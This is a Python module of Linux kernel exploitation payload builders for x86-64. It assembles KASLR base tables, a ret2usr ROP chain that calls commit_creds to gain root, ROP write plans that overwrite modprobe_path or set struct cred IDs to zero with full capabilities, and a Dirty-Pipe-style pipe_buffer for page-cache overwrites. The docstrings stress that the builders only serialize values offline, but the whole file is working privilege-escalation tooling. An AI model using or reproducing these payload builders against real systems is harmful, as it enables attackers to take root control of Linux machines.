"""Offline, address-parameterized Linux kernel exploitation payload builders.

The builders in this module only serialize caller-supplied values.  They do not
open devices, execute generated bytes, contact targets, or infer addresses.
Every public builder returns a :class:`KernelPayload` containing the raw bytes
and an immutable mapping from semantic names to byte offsets in that payload.

The layouts are intentionally explicit: kernel structure layouts and useful
gadgets vary by build, so offsets and addresses that are not architectural are
always supplied by the caller.
"""
from __future__ import annotations

from types import MappingProxyType
from typing import Mapping, Sequence
import struct

try:  # package import and direct toolkit-path import are both supported
    from .contract import BuildError, PayloadBuild
except ImportError:  # pragma: no cover - repository tests use direct toolkit imports
    from contract import BuildError, PayloadBuild


U64_MAX = (1 << 64) - 1
U32_MAX = (1 << 32) - 1
PIPE_BUF_FLAG_CAN_MERGE = 0x10
PT_REGS_X86_64 = (
    "r15", "r14", "r13", "r12", "rbp", "rbx", "r11", "r10",
    "r9", "r8", "rax", "rcx", "rdx", "rsi", "rdi", "orig_rax",
    "rip", "cs", "eflags", "rsp", "ss",
)


class KernelBuildError(BuildError):
    """A requested kernel payload cannot be represented safely."""


class KernelPayload(PayloadBuild):
    """A byte payload plus exact semantic byte placements.

    ``placements`` always points into ``payload``.  ``targets`` records remote
    kernel addresses affected by write plans; it is descriptive only.
    ``metadata`` contains arithmetic results and selected variants.
    """

    def __init__(
        self,
        payload: bytes,
        placements: Mapping[str, int],
        targets: Mapping[str, int] | None = None,
        metadata: Mapping[str, object] | None = None,
        *,
        widths: Mapping[str, int] | None = None,
        strategy: str | None = None,
        base_address: int = 0,
    ) -> None:
        if not isinstance(payload, bytes):
            payload = bytes(payload)
        raw_metadata = dict(metadata or {})
        rendered_metadata = {
            str(key): value if isinstance(value, str) else repr(value)
            for key, value in raw_metadata.items()
        }
        chosen_strategy = strategy or str(raw_metadata.get("kind", "kernel-template"))
        super().__init__(
            payload=payload,
            placements=placements,
            widths=widths or {},
            architecture="linux-kernel-x86_64",
            strategy=chosen_strategy,
            base_address=base_address,
            metadata=rendered_metadata,
        )
        frozen_targets: dict[str, int] = {}
        for name, address in dict(targets or {}).items():
            if not isinstance(name, str) or not name:
                raise KernelBuildError("target names must be non-empty strings")
            frozen_targets[name] = _u64(address, f"target {name}")
        object.__setattr__(self, "targets", MappingProxyType(dict(sorted(frozen_targets.items()))))

    def as_dict(self) -> dict[str, object]:
        return {
            **super().as_dict(),
            "targets": dict(self.targets),
        }


def _u64(value: int, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= U64_MAX:
        raise KernelBuildError(f"{name} must be an unsigned 64-bit integer")
    return value


def _u32(value: int, name: str) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= U32_MAX:
        raise KernelBuildError(f"{name} must be an unsigned 32-bit integer")
    return value


def _qword(buf: bytearray, placements: dict[str, int], name: str, value: int) -> None:
    placements[name] = len(buf)
    buf.extend(struct.pack("<Q", _u64(value, name)))


def _canonical_x86_64(value: int, name: str, *, allow_zero: bool = False) -> int:
    value = _u64(value, name)
    if value == 0 and allow_zero:
        return value
    high = value >> 48
    if high not in (0, 0xFFFF):
        raise KernelBuildError(f"{name} is not a canonical x86-64 address")
    return value


def build_kaslr_rebase(
    *,
    leaked_address: int,
    leaked_symbol_offset: int,
    symbol_offsets: Mapping[str, int],
    expected_alignment: int = 0x100000,
    base_adjustment: int = 0,
) -> KernelPayload:
    """Serialize a KASLR base calculation and requested resolved symbols.

    ``base = leaked_address - leaked_symbol_offset + base_adjustment``.  The
    result payload is a qword table: base first, then symbols sorted by name.
    Sorting makes identical inputs deterministic regardless of mapping order.
    """

    leak = _canonical_x86_64(leaked_address, "leaked_address")
    offset = _u64(leaked_symbol_offset, "leaked_symbol_offset")
    if isinstance(base_adjustment, bool) or not isinstance(base_adjustment, int):
        raise KernelBuildError("base_adjustment must be an integer")
    if expected_alignment <= 0 or expected_alignment & (expected_alignment - 1):
        raise KernelBuildError("expected_alignment must be a positive power of two")
    base = leak - offset + base_adjustment
    _canonical_x86_64(base, "calculated kernel base")
    if base % expected_alignment:
        raise KernelBuildError("calculated kernel base violates expected alignment")
    if not symbol_offsets:
        raise KernelBuildError("at least one symbol offset is required")

    buf = bytearray()
    placements: dict[str, int] = {}
    resolved: dict[str, int] = {}
    _qword(buf, placements, "kernel_base", base)
    for name in sorted(symbol_offsets):
        if not isinstance(name, str) or not name:
            raise KernelBuildError("symbol names must be non-empty strings")
        sym_offset = _u64(symbol_offsets[name], f"symbol_offsets[{name!r}]")
        address = base + sym_offset
        _canonical_x86_64(address, f"resolved symbol {name}")
        resolved[name] = address
        _qword(buf, placements, f"symbol.{name}", address)
    return KernelPayload(
        bytes(buf), placements,
        metadata={"kernel_base": base, "resolved": resolved,
                  "alignment": expected_alignment, "kind": "kaslr-rebase-table"},
    )


def build_pt_regs_frame(
    registers: Mapping[str, int] | None = None,
    *,
    prefix: bytes = b"",
    strict: bool = True,
) -> KernelPayload:
    """Build the x86-64 Linux ``struct pt_regs`` stack frame.

    Fields follow the kernel entry ABI order.  Missing values are zero.  With
    ``strict=True`` unknown register names are rejected instead of ignored.
    """

    if not isinstance(prefix, (bytes, bytearray)):
        raise KernelBuildError("prefix must be bytes")
    values = dict(registers or {})
    unknown = sorted(set(values) - set(PT_REGS_X86_64))
    if strict and unknown:
        raise KernelBuildError(f"unknown pt_regs fields: {', '.join(unknown)}")
    buf = bytearray(bytes(prefix))
    placements: dict[str, int] = {"prefix": 0, "pt_regs": len(buf)}
    for name in PT_REGS_X86_64:
        _qword(buf, placements, f"pt_regs.{name}", values.get(name, 0))
    placements["pt_regs.end"] = len(buf)
    return KernelPayload(
        bytes(buf), placements,
        metadata={"architecture": "x86_64", "field_order": PT_REGS_X86_64,
                  "kind": "pt_regs"},
    )


def build_ret2usr(
    *,
    padding: bytes = b"",
    pop_rdi_ret: int,
    commit_creds: int,
    user_rip: int,
    user_cs: int,
    user_rflags: int,
    user_rsp: int,
    user_ss: int,
    prepare_kernel_cred: int | None = None,
    mov_rdi_rax_ret: int | None = None,
    init_cred: int | None = None,
    swapgs_ret: int | None = None,
    iretq: int | None = None,
    trampoline: int | None = None,
    trampoline_padding_qwords: int = 2,
) -> KernelPayload:
    """Build a classic x86-64 kernel ret2usr credential-and-return chain.

    Credential selection is explicit:

    * supply ``prepare_kernel_cred`` and ``mov_rdi_rax_ret`` to call
      ``commit_creds(prepare_kernel_cred(NULL))``; or
    * supply ``init_cred`` to call ``commit_creds(&init_cred)``.

    Return selection is also explicit: either ``swapgs_ret`` + ``iretq`` or a
    KPTI ``trampoline``.  All addresses and saved user state come from caller.
    """

    if not isinstance(padding, (bytes, bytearray)):
        raise KernelBuildError("padding must be bytes")
    if len(padding) > 1 << 20:
        raise KernelBuildError("padding exceeds 1 MiB cap")
    _canonical_x86_64(pop_rdi_ret, "pop_rdi_ret")
    _canonical_x86_64(commit_creds, "commit_creds")
    modes = int(init_cred is not None) + int(
        prepare_kernel_cred is not None or mov_rdi_rax_ret is not None
    )
    if modes != 1:
        raise KernelBuildError(
            "choose exactly one credential route: init_cred or prepare_kernel_cred/mov_rdi_rax_ret"
        )
    if init_cred is None and (prepare_kernel_cred is None or mov_rdi_rax_ret is None):
        raise KernelBuildError("prepare route requires both prepare_kernel_cred and mov_rdi_rax_ret")
    direct_return = swapgs_ret is not None or iretq is not None
    if trampoline is not None and direct_return:
        raise KernelBuildError("choose trampoline or swapgs_ret/iretq, not both")
    if trampoline is None and (swapgs_ret is None or iretq is None):
        raise KernelBuildError("direct return requires swapgs_ret and iretq")
    if isinstance(trampoline_padding_qwords, bool) or not 0 <= trampoline_padding_qwords <= 16:
        raise KernelBuildError("trampoline_padding_qwords must be in 0..16")

    buf = bytearray(bytes(padding))
    p: dict[str, int] = {"padding": 0, "rop": len(buf)}
    if init_cred is not None:
        _qword(buf, p, "rop.pop_rdi", pop_rdi_ret)
        _qword(buf, p, "rop.init_cred", _canonical_x86_64(init_cred, "init_cred"))
        credential_mode = "commit-init-cred"
    else:
        _qword(buf, p, "rop.pop_rdi", pop_rdi_ret)
        _qword(buf, p, "rop.prepare.arg", 0)
        _qword(buf, p, "rop.prepare_kernel_cred", _canonical_x86_64(prepare_kernel_cred, "prepare_kernel_cred"))
        _qword(buf, p, "rop.mov_rdi_rax", _canonical_x86_64(mov_rdi_rax_ret, "mov_rdi_rax_ret"))
        credential_mode = "prepare-commit"
    _qword(buf, p, "rop.commit_creds", commit_creds)

    if trampoline is not None:
        _qword(buf, p, "return.trampoline", _canonical_x86_64(trampoline, "trampoline"))
        for index in range(trampoline_padding_qwords):
            _qword(buf, p, f"return.trampoline_pad.{index}", 0)
        return_mode = "kpti-trampoline"
    else:
        _qword(buf, p, "return.swapgs", _canonical_x86_64(swapgs_ret, "swapgs_ret"))
        _qword(buf, p, "return.swapgs_dummy", 0)
        _qword(buf, p, "return.iretq", _canonical_x86_64(iretq, "iretq"))
        return_mode = "swapgs-iretq"

    for name, value in (
        ("user.rip", user_rip), ("user.cs", user_cs),
        ("user.rflags", user_rflags), ("user.rsp", user_rsp), ("user.ss", user_ss),
    ):
        _qword(buf, p, name, value)
    p["end"] = len(buf)
    return KernelPayload(
        bytes(buf), p,
        metadata={"architecture": "x86_64", "credential_mode": credential_mode,
                  "return_mode": return_mode, "kind": "ret2usr"},
    )


def build_modprobe_path_overwrite(
    *,
    modprobe_path_address: int,
    replacement_path: bytes | str,
    pop_address_ret: int,
    pop_value_ret: int,
    write_qword_gadget: int,
    padding: bytes = b"",
    max_path: int = 255,
) -> KernelPayload:
    """Build a qword-store ROP plan that replaces ``modprobe_path``.

    The path is NUL-terminated and padded into qword writes.  This models a
    gadget equivalent to ``mov qword ptr [address_reg], value_reg ; ret``;
    register choice is deliberately left to caller documentation.
    """

    if isinstance(replacement_path, str):
        try:
            path = replacement_path.encode("utf-8")
        except UnicodeError as exc:
            raise KernelBuildError("replacement_path is not valid UTF-8") from exc
    elif isinstance(replacement_path, (bytes, bytearray)):
        path = bytes(replacement_path)
    else:
        raise KernelBuildError("replacement_path must be bytes or text")
    if not path or len(path) > max_path or b"\x00" in path:
        raise KernelBuildError("replacement_path must be non-empty, bounded, and contain no NUL")
    if not path.startswith(b"/"):
        raise KernelBuildError("replacement_path must be absolute")
    if not isinstance(padding, (bytes, bytearray)):
        raise KernelBuildError("padding must be bytes")
    base = _canonical_x86_64(modprobe_path_address, "modprobe_path_address")
    gadgets = (
        _canonical_x86_64(pop_address_ret, "pop_address_ret"),
        _canonical_x86_64(pop_value_ret, "pop_value_ret"),
        _canonical_x86_64(write_qword_gadget, "write_qword_gadget"),
    )
    terminated = path + b"\x00"
    terminated += b"\x00" * (-len(terminated) % 8)
    buf = bytearray(bytes(padding))
    p: dict[str, int] = {"padding": 0, "rop": len(buf)}
    targets: dict[str, int] = {}
    for index in range(0, len(terminated), 8):
        chunk = terminated[index:index + 8]
        label = f"write.{index // 8}"
        target = base + index
        targets[label] = target
        _qword(buf, p, f"{label}.pop_address", gadgets[0])
        _qword(buf, p, f"{label}.target", target)
        _qword(buf, p, f"{label}.pop_value", gadgets[1])
        _qword(buf, p, f"{label}.value", int.from_bytes(chunk, "little"))
        _qword(buf, p, f"{label}.store", gadgets[2])
    p["end"] = len(buf)
    return KernelPayload(
        bytes(buf), p, targets,
        {"kind": "modprobe-path-qword-write", "path": path.decode("utf-8", "surrogateescape"),
         "write_count": len(terminated) // 8, "terminated_length": len(terminated)},
    )


_DEFAULT_CRED_FIELDS: tuple[tuple[str, int, int], ...] = (
    ("uid", 0x04, 4), ("gid", 0x08, 4), ("suid", 0x0C, 4), ("sgid", 0x10, 4),
    ("euid", 0x14, 4), ("egid", 0x18, 4), ("fsuid", 0x1C, 4), ("fsgid", 0x20, 4),
    ("securebits", 0x24, 4), ("cap_inheritable", 0x28, 8),
    ("cap_permitted", 0x30, 8), ("cap_effective", 0x38, 8),
    ("cap_bset", 0x40, 8), ("cap_ambient", 0x48, 8),
)


def build_cred_overwrite(
    *,
    cred_address: int,
    pop_address_ret: int,
    pop_value_ret: int,
    write_dword_gadget: int,
    write_qword_gadget: int,
    field_layout: Sequence[tuple[str, int, int]] = _DEFAULT_CRED_FIELDS,
    field_values: Mapping[str, int] | None = None,
    padding: bytes = b"",
) -> KernelPayload:
    """Build width-correct writes for a caller-confirmed ``struct cred`` layout.

    The default is a common modern x86-64 layout template, never a claim about
    a target kernel.  Callers should supply ``field_layout`` from their exact
    build.  ID fields default to zero and capability fields to all ones.
    """

    if not isinstance(padding, (bytes, bytearray)):
        raise KernelBuildError("padding must be bytes")
    base = _canonical_x86_64(cred_address, "cred_address")
    pop_addr = _canonical_x86_64(pop_address_ret, "pop_address_ret")
    pop_value = _canonical_x86_64(pop_value_ret, "pop_value_ret")
    write4 = _canonical_x86_64(write_dword_gadget, "write_dword_gadget")
    write8 = _canonical_x86_64(write_qword_gadget, "write_qword_gadget")
    overrides = dict(field_values or {})
    names = [row[0] for row in field_layout]
    unknown = sorted(set(overrides) - set(names))
    if unknown:
        raise KernelBuildError(f"values supplied for unknown cred fields: {', '.join(unknown)}")
    if not field_layout or len(field_layout) > 128:
        raise KernelBuildError("field_layout must contain 1..128 entries")
    buf = bytearray(bytes(padding))
    p: dict[str, int] = {"padding": 0, "rop": len(buf)}
    targets: dict[str, int] = {}
    seen: set[str] = set()
    spans: list[tuple[int, int]] = []
    for row in field_layout:
        if not isinstance(row, tuple) or len(row) != 3:
            raise KernelBuildError("each cred field layout must be (name, offset, width)")
        name, offset, width = row
        if not isinstance(name, str) or not name or name in seen:
            raise KernelBuildError("cred field names must be unique non-empty strings")
        seen.add(name)
        if isinstance(offset, bool) or not isinstance(offset, int) or not 0 <= offset <= 0x10000:
            raise KernelBuildError(f"invalid offset for cred field {name}")
        if width not in (4, 8) or offset % width:
            raise KernelBuildError(f"cred field {name} must be aligned width 4 or 8")
        span = (offset, offset + width)
        if any(span[0] < old_end and old_start < span[1] for old_start, old_end in spans):
            raise KernelBuildError(f"cred field {name} overlaps another field")
        spans.append(span)
        default = U64_MAX if name.startswith("cap_") and width == 8 else 0
        value = overrides.get(name, default)
        if width == 4:
            value = _u32(value, f"field_values[{name!r}]")
        else:
            value = _u64(value, f"field_values[{name!r}]")
        label = f"cred.{name}"
        target = base + offset
        targets[label] = target
        _qword(buf, p, f"{label}.pop_address", pop_addr)
        _qword(buf, p, f"{label}.target", target)
        _qword(buf, p, f"{label}.pop_value", pop_value)
        _qword(buf, p, f"{label}.value", value)
        _qword(buf, p, f"{label}.store", write4 if width == 4 else write8)
    p["end"] = len(buf)
    return KernelPayload(
        bytes(buf), p, targets,
        {"kind": "cred-field-write-plan", "field_count": len(field_layout),
         "layout": tuple(field_layout)},
    )


def build_pipe_buffer(
    *,
    page: int,
    offset: int,
    length: int,
    ops: int,
    flags: int,
    private: int = 0,
    prefix: bytes = b"",
) -> KernelPayload:
    """Serialize the common 64-bit Linux ``struct pipe_buffer`` layout.

    Layout: page pointer, u32 offset, u32 len, ops pointer, u32 flags,
    four bytes alignment, u64 private.  Callers must confirm it for the kernel.
    """

    if not isinstance(prefix, (bytes, bytearray)):
        raise KernelBuildError("prefix must be bytes")
    page = _canonical_x86_64(page, "page")
    ops = _canonical_x86_64(ops, "ops")
    offset = _u32(offset, "offset")
    length = _u32(length, "length")
    flags = _u32(flags, "flags")
    private = _u64(private, "private")
    buf = bytearray(bytes(prefix))
    p: dict[str, int] = {"prefix": 0, "pipe_buffer": len(buf)}
    p["pipe_buffer.page"] = len(buf); buf.extend(struct.pack("<Q", page))
    p["pipe_buffer.offset"] = len(buf); buf.extend(struct.pack("<I", offset))
    p["pipe_buffer.length"] = len(buf); buf.extend(struct.pack("<I", length))
    p["pipe_buffer.ops"] = len(buf); buf.extend(struct.pack("<Q", ops))
    p["pipe_buffer.flags"] = len(buf); buf.extend(struct.pack("<I", flags))
    p["pipe_buffer.alignment"] = len(buf); buf.extend(b"\x00" * 4)
    p["pipe_buffer.private"] = len(buf); buf.extend(struct.pack("<Q", private))
    p["pipe_buffer.end"] = len(buf)
    return KernelPayload(
        bytes(buf), p,
        metadata={"kind": "pipe-buffer", "layout": "linux-x86_64-common-v1",
                  "can_merge": bool(flags & PIPE_BUF_FLAG_CAN_MERGE)},
    )


def build_pipe_page_cache_primitive(
    *,
    page: int,
    pipe_buf_ops: int,
    file_offset: int,
    replacement: bytes,
    page_size: int = 4096,
    original_pipe_length: int | None = None,
) -> KernelPayload:
    """Build a Dirty-Pipe-style mergeable pipe-buffer + replacement bundle.

    The first byte of a file page cannot be targeted by the classic splice
    primitive and a write cannot cross a page boundary; both invariants are
    enforced.  The output is a structural bundle, not a syscall driver.
    """

    if not isinstance(replacement, (bytes, bytearray)) or not replacement:
        raise KernelBuildError("replacement must be non-empty bytes")
    replacement = bytes(replacement)
    if page_size < 512 or page_size > (1 << 20) or page_size & (page_size - 1):
        raise KernelBuildError("page_size must be a power of two in 512..1048576")
    file_offset = _u64(file_offset, "file_offset")
    in_page = file_offset % page_size
    if in_page == 0:
        raise KernelBuildError("classic pipe page-cache primitive cannot target a page boundary")
    if in_page + len(replacement) > page_size:
        raise KernelBuildError("replacement crosses a page boundary")
    length = in_page if original_pipe_length is None else _u32(original_pipe_length, "original_pipe_length")
    header = build_pipe_buffer(
        page=page, offset=0, length=length, ops=pipe_buf_ops,
        flags=PIPE_BUF_FLAG_CAN_MERGE, private=0,
    )
    payload = header.payload + replacement
    p = dict(header.placements)
    p["replacement"] = len(header.payload)
    p["replacement.end"] = len(payload)
    return KernelPayload(
        payload, p,
        targets={"page_cache.file_offset": file_offset},
        metadata={"kind": "pipe-page-cache-merge", "page_size": page_size,
                  "file_offset": file_offset, "in_page_offset": in_page,
                  "replacement_length": len(replacement)},
    )


